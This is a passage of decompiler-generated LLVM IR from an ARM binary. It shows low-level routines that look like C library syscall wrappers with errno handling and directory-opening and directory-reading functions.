  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12e8c = load i32, i32* @r7, align 4
  store i32 %v3_12e8c, i32* %stack_var_-8, align 4
  %v0_12e98 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12e98, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_12e98, -4095
  br i1 %tmp, label %dec_label_pc_12eb8, label %dec_label_pc_12ea8

dec_label_pc_12ea8:                               ; preds = %dec_label_pc_12e8c
  %v0_12ea8 = call i32 @function_d0ec()
  %v0_12eac = load i32, i32* %r7.global-to-local, align 4
  %v1_12eac = sub i32 0, %v0_12eac
  %v2_12eb0 = inttoptr i32 %v0_12ea8 to i32*
  store i32 %v1_12eac, i32* %v2_12eb0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_12eb8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12eb8

dec_label_pc_12eb8:                               ; preds = %dec_label_pc_12e8c, %dec_label_pc_12ea8
  %v1_12ebc = phi i32 [ %v0_12e98, %dec_label_pc_12e8c ], [ -1, %dec_label_pc_12ea8 ]
  %v2_12eb8 = phi i32 [ %v3_12e8c, %dec_label_pc_12e8c ], [ %v2_12eb8.pre, %dec_label_pc_12ea8 ]
  store i32 %v2_12eb8, i32* @r7, align 4
  ret i32 %v1_12ebc

; uselistorder directives
  uselistorder i32 %v0_12e98, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12eb8, { 1, 0 }
}

define i32 @function_12ec0(i32 %arg1) local_unnamed_addr {
dec_label_pc_12ec0:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12ec4.outer

dec_label_pc_12ec4.outer:                         ; preds = %dec_label_pc_12edc, %dec_label_pc_12ec0
  %v0_12ec4.ph = phi i32 [ %v0_12ec4.pre.pre, %dec_label_pc_12edc ], [ %arg1, %dec_label_pc_12ec0 ]
  %tmp = icmp ult i32 %v0_12ec4.ph, -4095
  br label %dec_label_pc_12ec4

dec_label_pc_12ec4:                               ; preds = %dec_label_pc_12ec4.outer, %dec_label_pc_12ec4
  br i1 %tmp, label %dec_label_pc_12ec4, label %dec_label_pc_12edc

dec_label_pc_12edc:                               ; preds = %dec_label_pc_12ec4
  %v0_12edc = call i32 @function_d0ec()
  %v1_12ee0 = sub i32 0, %v0_12ec4.ph
  %v2_12ee4 = inttoptr i32 %v0_12edc to i32*
  store i32 %v1_12ee0, i32* %v2_12ee4, align 4
  %v0_12ec4.pre.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12ec4.outer

; uselistorder directives
  uselistorder i32 %v0_12ec4.ph, { 1, 0 }
  uselistorder label %dec_label_pc_12ec4, { 1, 0 }
}

define i32 @function_12eec(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_12eec:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12eec = load i32, i32* @r7, align 4
  store i32 %v3_12eec, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_12f18, label %dec_label_pc_12f08

dec_label_pc_12f08:                               ; preds = %dec_label_pc_12eec
  %v0_12f08 = call i32 @function_d0ec()
  %v0_12f0c = load i32, i32* %r7.global-to-local, align 4
  %v1_12f0c = sub i32 0, %v0_12f0c
  %v2_12f10 = inttoptr i32 %v0_12f08 to i32*
  store i32 %v1_12f0c, i32* %v2_12f10, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_12f1c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_12f18

dec_label_pc_12f18:                               ; preds = %dec_label_pc_12eec, %dec_label_pc_12f08
  %v2_12f1c = phi i32 [ %v3_12eec, %dec_label_pc_12eec ], [ %v2_12f1c.pre, %dec_label_pc_12f08 ]
  %v0_12f18 = phi i32 [ %arg1, %dec_label_pc_12eec ], [ -1, %dec_label_pc_12f08 ]
  store i32 %v2_12f1c, i32* @r7, align 4
  ret i32 %v0_12f18

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12f18, { 1, 0 }
}

define i32 @function_12f24(i32* %arg1) local_unnamed_addr {
dec_label_pc_12f24:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_12f24 = load i32, i32* @r4, align 4
  store i32 %v3_12f24, i32* %stack_var_-24, align 4
  %v2_12f28 = load i32, i32* %arg1, align 4
  store i32 %v2_12f28, i32* %r4.global-to-local, align 4
  %v3_12f30 = icmp eq i32 %v2_12f28, -1
  store i32 %tmp, i32* @r7, align 4
  store i32 142964, i32* @r6, align 4
  br i1 %v3_12f30, label %dec_label_pc_12f44, label %dec_label_pc_12f58

dec_label_pc_12f44:                               ; preds = %dec_label_pc_12f24
  %v0_12f44 = call i32 @function_d0ec()
  store i32 9, i32* %r3.global-to-local, align 4
  %v0_12f4c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12f4c, i32* %r2.global-to-local, align 4
  %v2_12f50 = inttoptr i32 %v0_12f44 to i32*
  store i32 9, i32* %v2_12f50, align 4
  %v0_12ff8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12ff8

dec_label_pc_12f58:                               ; preds = %dec_label_pc_12f24
  store i32 36, i32* %r3.global-to-local, align 4
  %v1_12f5c = add i32 %tmp, 24
  store i32 %v1_12f5c, i32* %r4.global-to-local, align 4
  store i32 %v1_12f5c, i32* %r2.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v4_12f70 = load i32, i32* inttoptr (i32 143040 to i32*), align 64
  call void @__pseudo_branch(i32 %v4_12f70)
  store i32 -1, i32* @r8, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v0_12f88 = load i32, i32* @r6, align 4
  %v2_12f88 = add i32 %v0_12f88, 16
  %v3_12f88 = inttoptr i32 %v2_12f88 to i32*
  %v4_12f88 = load i32, i32* %v3_12f88, align 4
  call void @__pseudo_branch(i32 %v4_12f88)
  %v0_12f94 = load i32, i32* @r7, align 4
  %v1_12f94 = inttoptr i32 %v0_12f94 to i32*
  %v2_12f94 = load i32, i32* %v1_12f94, align 4
  store i32 %v2_12f94, i32* @r4, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_12fa4 = load i32, i32* @r8, align 4
  store i32 %v0_12fa4, i32* %v1_12f94, align 4
  %v0_12fa8 = load i32, i32* @r6, align 4
  %v1_12fa8 = load i32, i32* %r3.global-to-local, align 4
  %v2_12fa8 = add i32 %v1_12fa8, %v0_12fa8
  %v3_12fa8 = inttoptr i32 %v2_12fa8 to i32*
  %v4_12fa8 = load i32, i32* %v3_12fa8, align 4
  store i32 ptrtoint (i32* @global_var_12fb4.579 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_12fa8)
  %v0_12fb4 = load i32, i32* @r7, align 4
  %v1_12fb4 = add i32 %v0_12fb4, 12
  %v2_12fb4 = inttoptr i32 %v1_12fb4 to i32*
  %v3_12fb4 = load i32, i32* %v2_12fb4, align 4
  store i32 %v3_12fb4, i32* @r0, align 4
  %v0_12fb8 = call i32 @function_11048()
  %v0_12fbc = load i32, i32* @r7, align 4
  store i32 %v0_12fbc, i32* @r0, align 4
  %v0_12fc0 = call i32 @function_11048()
  %v0_12fc8 = load i32, i32* @r4, align 4
  %tmp11 = icmp ult i32 %v0_12fc8, -4095
  br i1 %tmp11, label %dec_label_pc_12ff4, label %dec_label_pc_12fe4

dec_label_pc_12fe4:                               ; preds = %dec_label_pc_12f58
  %v0_12fe4 = call i32 @function_d0ec()
  %v0_12fe8 = load i32, i32* @r4, align 4
  %v1_12fe8 = sub i32 0, %v0_12fe8
  store i32 %v1_12fe8, i32* %r3.global-to-local, align 4
  %v2_12fec = inttoptr i32 %v0_12fe4 to i32*
  store i32 %v1_12fe8, i32* %v2_12fec, align 4
  %v0_12ff0 = load i32, i32* @r8, align 4
  br label %dec_label_pc_12ff4

dec_label_pc_12ff4:                               ; preds = %dec_label_pc_12f58, %dec_label_pc_12fe4
  %v0_12ff4 = phi i32 [ %v0_12fc8, %dec_label_pc_12f58 ], [ %v0_12ff0, %dec_label_pc_12fe4 ]
  store i32 %v0_12ff4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12ff8

dec_label_pc_12ff8:                               ; preds = %dec_label_pc_12f44, %dec_label_pc_12ff4
  %v0_12ff8 = phi i32 [ %v0_12ff8.pre, %dec_label_pc_12f44 ], [ %v0_12ff4, %dec_label_pc_12ff4 ]
  %v2_13000 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_13000, i32* %r4.global-to-local, align 4
  ret i32 %v0_12ff8

; uselistorder directives
  uselistorder i32 %v0_12fc8, { 1, 0 }
  uselistorder label %dec_label_pc_12ff8, { 1, 0 }
  uselistorder label %dec_label_pc_12ff4, { 1, 0 }
}

define i32 @function_1300c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1300c:
  %v0_1300c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1300c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1300c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1300c, %bb
  %v10_13018 = phi i32 [ %arg1, %dec_label_pc_1300c ], [ 0, %bb ]
  ret i32 %v10_13018

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_1301c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1301c:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v12_1301c = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  %v1_13030 = call i32 @function_10110(i32 48)
  %v2_13038 = icmp eq i32 %v1_13030, 0
  store i32 142964, i32* @r6, align 4
  br i1 %v2_13038, label %bb, label %dec_label_pc_13048

bb:                                               ; preds = %dec_label_pc_1301c
  br label %dec_label_pc_130d4

dec_label_pc_13048:                               ; preds = %dec_label_pc_1301c
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1304c = load i32, i32* @r4, align 4
  %v2_1304c = icmp ugt i32 %v0_1304c, 511
  %v2_13050 = add i32 %v1_13030, 4
  %v3_13050 = inttoptr i32 %v2_13050 to i32*
  store i32 0, i32* %v3_13050, align 4
  %v0_13054 = load i32, i32* %r3.global-to-local, align 4
  %v2_13054 = add i32 %v1_13030, 16
  %v3_13054 = inttoptr i32 %v2_13054 to i32*
  store i32 %v0_13054, i32* %v3_13054, align 4
  %v0_13058 = load i32, i32* %r3.global-to-local, align 4
  %v2_13058 = add i32 %v1_13030, 8
  %v3_13058 = inttoptr i32 %v2_13058 to i32*
  store i32 %v0_13058, i32* %v3_13058, align 4
  br i1 %v2_1304c, label %.thread, label %bb16

.thread:                                          ; preds = %dec_label_pc_13048
  %v0_130602 = load i32, i32* @r4, align 4
  %v2_130603 = add i32 %v1_13030, 20
  %v3_130604 = inttoptr i32 %v2_130603 to i32*
  store i32 %v0_130602, i32* %v3_130604, align 4
  br label %bb17

bb16:                                             ; preds = %dec_label_pc_13048
  %v1_1305c = load i32, i32* %r3.global-to-local, align 4
  %v2_1305c = add i32 %v1_1305c, 512
  store i32 %v2_1305c, i32* %r3.global-to-local, align 4
  %v0_13060 = load i32, i32* @r4, align 4
  %v2_13060 = add i32 %v1_13030, 20
  %v3_13060 = inttoptr i32 %v2_13060 to i32*
  store i32 %v0_13060, i32* %v3_13060, align 4
  %v1_13064 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_13064, i32* %v3_13060, align 4
  br label %bb17

bb17:                                             ; preds = %.thread, %bb16
  store i32 %v1_13030, i32* @r5, align 4
  %v0_1306c = load i32, i32* @r7, align 4
  %v2_1306c = inttoptr i32 %v1_13030 to i32*
  store i32 %v0_1306c, i32* %v2_1306c, align 4
  %v0_13070 = load i32, i32* @r5, align 4
  %v1_13070 = add i32 %v0_13070, 20
  %v2_13070 = inttoptr i32 %v1_13070 to i32*
  %v3_13070 = load i32, i32* %v2_13070, align 4
  store i32 %v3_13070, i32* %r1.global-to-local, align 4
  %v2_13078 = call i32 @function_15540(i32 1, i32 %v3_13070)
  %v2_1307c = icmp eq i32 %v2_13078, 0
  store i32 %v2_13078, i32* @r4, align 4
  %v1_13084 = load i32, i32* @r5, align 4
  %v2_13084 = add i32 %v1_13084, 12
  %v3_13084 = inttoptr i32 %v2_13084 to i32*
  store i32 %v2_13078, i32* %v3_13084, align 4
  br i1 %v2_1307c, label %dec_label_pc_1308c, label %dec_label_pc_1309c

dec_label_pc_1308c:                               ; preds = %bb17
  %v0_1308c = load i32, i32* @r5, align 4
  store i32 %v0_1308c, i32* @r0, align 4
  %v0_13090 = call i32 @function_11048()
  %v0_13094 = load i32, i32* @r4, align 4
  br label %dec_label_pc_130d4

dec_label_pc_1309c:                               ; preds = %bb17
  store i32 0, i32* %stack_var_-32, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_130c4 = load i32, i32* @r5, align 4
  %v1_130c4 = add i32 %v0_130c4, 24
  %v1_130c8 = inttoptr i32 %v1_130c4 to i32*
  store i32 0, i32* %v1_130c8, align 4
  %v3_130c8 = add i32 %v0_130c4, 28
  %v4_130c8 = inttoptr i32 %v3_130c8 to i32*
  %v5_130c8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_130c8, i32* %v4_130c8, align 4
  %v6_130c8 = add i32 %v0_130c4, 32
  %v7_130c8 = inttoptr i32 %v6_130c8 to i32*
  %v8_130c8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_130c8, i32* %v7_130c8, align 4
  %v9_130c8 = add i32 %v0_130c4, 36
  %v10_130c8 = inttoptr i32 %v9_130c8 to i32*
  %v11_130c8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_130c8, i32* %v10_130c8, align 4
  %v12_130c8 = add i32 %v0_130c4, 40
  %v2_130cc = load i32, i32* %stack_var_-32, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_130d0 = inttoptr i32 %v12_130c8 to i32*
  store i32 %v2_130cc, i32* %v1_130d0, align 4
  %v3_130d0 = add i32 %v0_130c4, 44
  %v4_130d0 = inttoptr i32 %v3_130d0 to i32*
  %v5_130d0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_130d0, i32* %v4_130d0, align 4
  %v0_130d4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_130d4

dec_label_pc_130d4:                               ; preds = %bb, %dec_label_pc_1308c, %dec_label_pc_1309c
  %v0_130d4 = phi i32 [ 0, %bb ], [ %v0_13094, %dec_label_pc_1308c ], [ %v0_130d4.pre, %dec_label_pc_1309c ]
  store i32 %v12_1301c, i32* @r7, align 4
  ret i32 %v0_130d4

; uselistorder directives
  uselistorder i32 %v2_13078, { 1, 0, 2 }
  uselistorder i32 %v1_13030, { 3, 2, 6, 0, 5, 4, 1, 7 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_130d4, { 2, 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @function_130ec(i32 %arg1) local_unnamed_addr {
dec_label_pc_130ec:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v2_130f4 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %arg1, i32* @r7, align 4
  %tmp7 = icmp ult i32 %arg1, -4095
  br i1 %tmp7, label %dec_label_pc_1311c, label %dec_label_pc_1310c

dec_label_pc_1310c:                               ; preds = %dec_label_pc_130ec
  %v0_1310c = call i32 @function_d0ec()
  %v0_13110 = load i32, i32* @r7, align 4
  %v1_13110 = sub i32 0, %v0_13110
  %v2_13114 = inttoptr i32 %v0_1310c to i32*
  store i32 %v1_13110, i32* %v2_13114, align 4
  br label %dec_label_pc_13140

dec_label_pc_1311c:                               ; preds = %dec_label_pc_130ec
  %v1_1311c = icmp slt i32 %arg1, 0
  br i1 %v1_1311c, label %dec_label_pc_13140, label %dec_label_pc_13124

dec_label_pc_13124:                               ; preds = %dec_label_pc_1311c
  store i32 %v2_130f4, i32* @r1, align 4
  %v0_13128 = call i32 @function_15758()
  %v1_1312c = icmp slt i32 %v0_13128, 0
  br i1 %v1_1312c, label %dec_label_pc_13134, label %dec_label_pc_13148

dec_label_pc_13134:                               ; preds = %dec_label_pc_13124
  br label %dec_label_pc_13140

dec_label_pc_13140:                               ; preds = %dec_label_pc_13134, %dec_label_pc_1311c, %dec_label_pc_1310c
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13184

dec_label_pc_13148:                               ; preds = %dec_label_pc_13124
  %v0_13150 = load i32, i32* @r7, align 4
  %v3_13154 = call i32 @function_12d78(i32 %v0_13150, i32 2, i32 1)
  %v0_13158 = load i32, i32* @r7, align 4
  %v2_13160 = call i32 @function_1301c(i32 %v0_13158, i32 %tmp)
  store i32 %v2_13160, i32* %r4.global-to-local, align 4
  %v2_13164 = icmp eq i32 %v2_13160, 0
  br i1 %v2_13164, label %dec_label_pc_1316c, label %dec_label_pc_13184

dec_label_pc_1316c:                               ; preds = %dec_label_pc_13148
  %v0_13178 = call i32 @function_d0ec()
  %v2_13180 = inttoptr i32 %v0_13178 to i32*
  store i32 12, i32* %v2_13180, align 4
  %v0_13184.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13184

dec_label_pc_13184:                               ; preds = %dec_label_pc_13148, %dec_label_pc_13140, %dec_label_pc_1316c
  %v0_13184 = phi i32 [ %v2_13160, %dec_label_pc_13148 ], [ 0, %dec_label_pc_13140 ], [ %v0_13184.pre, %dec_label_pc_1316c ]
  ret i32 %v0_13184

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_13184, { 2, 0, 1 }
}

define i32 @function_13194(i32 %arg1) local_unnamed_addr {
dec_label_pc_13194:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %v0_13194 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13194, label %bb, label %dec_label_pc_13194._crit_edge

dec_label_pc_13194._crit_edge:                    ; preds = %dec_label_pc_13194
  br label %bb11

bb:                                               ; preds = %dec_label_pc_13194
  br label %bb11

bb11:                                             ; preds = %dec_label_pc_13194._crit_edge, %bb
  %v2_1319c = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_1319c, i32* @r1, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_131a8 = call i32 @function_15758()
  store i32 %v0_131a8, i32* @r5, align 4
  %v2_131ac = icmp eq i32 %v0_131a8, 0
  br i1 %v2_131ac, label %dec_label_pc_131b4, label %dec_label_pc_1321c

dec_label_pc_131b4:                               ; preds = %bb11
  %v1_131b8 = and i32 %tmp5, 61440
  store i32 %v1_131b8, i32* @r3, align 4
  %v7_131bc = icmp eq i32 %v1_131b8, 16384
  br i1 %v7_131bc, label %dec_label_pc_131d4, label %dec_label_pc_131c4

dec_label_pc_131c4:                               ; preds = %dec_label_pc_131b4
  %v0_131c4 = call i32 @function_d0ec()
  br label %dec_label_pc_13200

dec_label_pc_131d4:                               ; preds = %dec_label_pc_131b4
  %v0_131d4 = load i32, i32* @r4, align 4
  %v2_131dc = call i32 @function_12d0c(i32 %v0_131d4, i32 3)
  %v7_131e0 = icmp eq i32 %v2_131dc, -1
  br i1 %v7_131e0, label %dec_label_pc_1321c, label %dec_label_pc_131e8

dec_label_pc_131e8:                               ; preds = %dec_label_pc_131d4
  %v1_131e8 = urem i32 %v2_131dc, 4
  %v7_131ec = icmp eq i32 %v1_131e8, 1
  br i1 %v7_131ec, label %dec_label_pc_131f4, label %dec_label_pc_13208

dec_label_pc_131f4:                               ; preds = %dec_label_pc_131e8
  %v0_131f4 = call i32 @function_d0ec()
  br label %dec_label_pc_13200

dec_label_pc_13200:                               ; preds = %dec_label_pc_131c4, %dec_label_pc_131f4
  %storemerge2 = phi i32 [ %v0_131c4, %dec_label_pc_131c4 ], [ %v0_131f4, %dec_label_pc_131f4 ]
  %storemerge = phi i32 [ 20, %dec_label_pc_131c4 ], [ 22, %dec_label_pc_131f4 ]
  %storemerge1 = load i32, i32* @r5, align 4
  store i32 %storemerge1, i32* %r2.global-to-local, align 4
  %v2_13200 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_13200, align 4
  %v0_13220.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13220

dec_label_pc_13208:                               ; preds = %dec_label_pc_131e8
  %v0_13208 = load i32, i32* @r4, align 4
  %v2_13210 = call i32 @function_1301c(i32 %v0_13208, i32 %tmp)
  store i32 %v2_13210, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13220

dec_label_pc_1321c:                               ; preds = %bb11, %dec_label_pc_131d4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13220

dec_label_pc_13220:                               ; preds = %dec_label_pc_13208, %dec_label_pc_13200, %dec_label_pc_1321c
  %v0_13220 = phi i32 [ %v2_13210, %dec_label_pc_13208 ], [ %v0_13220.pre, %dec_label_pc_13200 ], [ 0, %dec_label_pc_1321c ]
  ret i32 %v0_13220

; uselistorder directives
  uselistorder i32 %v2_131dc, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_1301c, { 1, 0 }
  uselistorder i32 16384, { 1, 0, 2 }
  uselistorder i32 ()* @function_15758, { 1, 0 }
  uselistorder label %dec_label_pc_13220, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1321c, { 1, 0 }
  uselistorder label %dec_label_pc_13200, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @function_13230(i32* %arg1) local_unnamed_addr {
dec_label_pc_13230:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 142964, i32* @r6, align 4
  %v1_13244 = add i32 %tmp, 24
  store i32 %v1_13244, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_1325c = load i32, i32* inttoptr (i32 143040 to i32*), align 64
  store i32 %v4_1325c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1325c)
  %v0_13270 = load i32, i32* @r6, align 4
  %v2_13270 = add i32 %v0_13270, 16
  %v3_13270 = inttoptr i32 %v2_13270 to i32*
  %v4_13270 = load i32, i32* %v3_13270, align 4
  store i32 %v4_13270, i32* %ip.global-to-local, align 4
  store i32 78460, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_13270)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_13280

dec_label_pc_13280:                               ; preds = %dec_label_pc_132b0, %dec_label_pc_13230
  %v0_13280 = load i32, i32* @r5, align 4
  %v1_13280 = add i32 %v0_13280, 4
  %v2_13280 = inttoptr i32 %v1_13280 to i32*
  %v3_13280 = load i32, i32* %v2_13280, align 4
  %v4_13280 = add i32 %v0_13280, 8
  %v5_13280 = inttoptr i32 %v4_13280 to i32*
  %v6_13280 = load i32, i32* %v5_13280, align 4
  %tmp10 = icmp ugt i32 %v6_13280, %v3_13280
  br i1 %tmp10, label %dec_label_pc_132b0, label %dec_label_pc_1328c

dec_label_pc_1328c:                               ; preds = %dec_label_pc_13280
  %v1_1328c = inttoptr i32 %v0_13280 to i32*
  %v2_1328c = load i32, i32* %v1_1328c, align 4
  %v1_13290 = add i32 %v0_13280, 12
  %v2_13290 = inttoptr i32 %v1_13290 to i32*
  %v3_13290 = load i32, i32* %v2_13290, align 4
  %v1_13294 = add i32 %v0_13280, 20
  %v2_13294 = inttoptr i32 %v1_13294 to i32*
  %v3_13294 = load i32, i32* %v2_13294, align 4
  %v4_13298 = inttoptr i32 %v3_13290 to i32*
  %v5_13298 = call i32 @function_159e0(i32 %v2_1328c, i32* %v4_13298, i32 %v3_13294, i32 %v6_13280)
  %tmp9 = icmp slt i32 %v5_13298, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_132a8

.thread:                                          ; preds = %dec_label_pc_1328c
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_132e0

dec_label_pc_132a8:                               ; preds = %dec_label_pc_1328c
  %v1_132a8 = load i32, i32* @r5, align 4
  %v2_132a8 = add i32 %v1_132a8, 8
  %v3_132a8 = inttoptr i32 %v2_132a8 to i32*
  store i32 %v5_13298, i32* %v3_132a8, align 4
  %v0_132ac = load i32, i32* @r7, align 4
  %v1_132ac = load i32, i32* @r5, align 4
  %v2_132ac = add i32 %v1_132ac, 4
  %v3_132ac = inttoptr i32 %v2_132ac to i32*
  store i32 %v0_132ac, i32* %v3_132ac, align 4
  %v0_132b0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_132b0

dec_label_pc_132b0:                               ; preds = %dec_label_pc_13280, %dec_label_pc_132a8
  %v1_132d4 = phi i32 [ %v0_13280, %dec_label_pc_13280 ], [ %v0_132b0.pre, %dec_label_pc_132a8 ]
  %v1_132b0 = add i32 %v1_132d4, 4
  %v2_132b0 = inttoptr i32 %v1_132b0 to i32*
  %v3_132b0 = load i32, i32* %v2_132b0, align 4
  %v1_132b4 = add i32 %v1_132d4, 12
  %v2_132b4 = inttoptr i32 %v1_132b4 to i32*
  %v3_132b4 = load i32, i32* %v2_132b4, align 4
  %v2_132b8 = add i32 %v3_132b4, %v3_132b0
  store i32 %v2_132b8, i32* @r4, align 4
  %v3_132bc = inttoptr i32 %v2_132b8 to i32*
  %v4_132bc = load i32, i32* %v3_132bc, align 4
  %v1_132c0 = add i32 %v2_132b8, 4
  %v2_132c0 = inttoptr i32 %v1_132c0 to i32*
  %v3_132c0 = load i32, i32* %v2_132c0, align 4
  %v1_132c4 = add i32 %v2_132b8, 16
  %v2_132c4 = inttoptr i32 %v1_132c4 to i16*
  %v3_132c4 = load i16, i16* %v2_132c4, align 2
  %v4_132c4 = zext i16 %v3_132c4 to i32
  %v1_132c8 = add i32 %v2_132b8, 8
  %v2_132c8 = inttoptr i32 %v1_132c8 to i32*
  %v3_132c8 = load i32, i32* %v2_132c8, align 4
  store i32 %v3_132c8, i32* %ip.global-to-local, align 4
  %v2_132cc = add i32 %v4_132c4, %v3_132b0
  %v2_132d0 = or i32 %v3_132c0, %v4_132bc
  %v4_132d0 = icmp eq i32 %v2_132d0, 0
  store i32 %v2_132cc, i32* %v2_132b0, align 4
  %v0_132d8 = load i32, i32* %ip.global-to-local, align 4
  %v1_132d8 = load i32, i32* @r5, align 4
  %v2_132d8 = add i32 %v1_132d8, 16
  %v3_132d8 = inttoptr i32 %v2_132d8 to i32*
  store i32 %v0_132d8, i32* %v3_132d8, align 4
  br i1 %v4_132d0, label %dec_label_pc_13280, label %dec_label_pc_132e0

dec_label_pc_132e0:                               ; preds = %dec_label_pc_132b0, %.thread
  %v0_132ec = load i32, i32* @r6, align 4
  %v2_132ec = add i32 %v0_132ec, 24
  %v3_132ec = inttoptr i32 %v2_132ec to i32*
  %v4_132ec = load i32, i32* %v3_132ec, align 4
  store i32 %v4_132ec, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_132ec)
  %v0_132f8 = load i32, i32* @r4, align 4
  ret i32 %v0_132f8

; uselistorder directives
  uselistorder i32 %v2_132b8, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_132d4, { 1, 0 }
  uselistorder i32 %v6_13280, { 1, 0 }
  uselistorder i32 %v0_13280, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_132b0, { 1, 0 }
}

define i32 @function_1330c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1330c:
  %v0_1330c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1330c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1330c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1330c, %bb
  %v10_13318 = phi i32 [ %arg1, %dec_label_pc_1330c ], [ 0, %bb ]
  ret i32 %v10_13318

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_1331c() local_unnamed_addr {
dec_label_pc_1331c:
  ret i32 ptrtoint (i32* @global_var_25870.596 to i32)
}

define i32 @function_13338(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_13338:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_13338 = load i32, i32* @r4, align 4
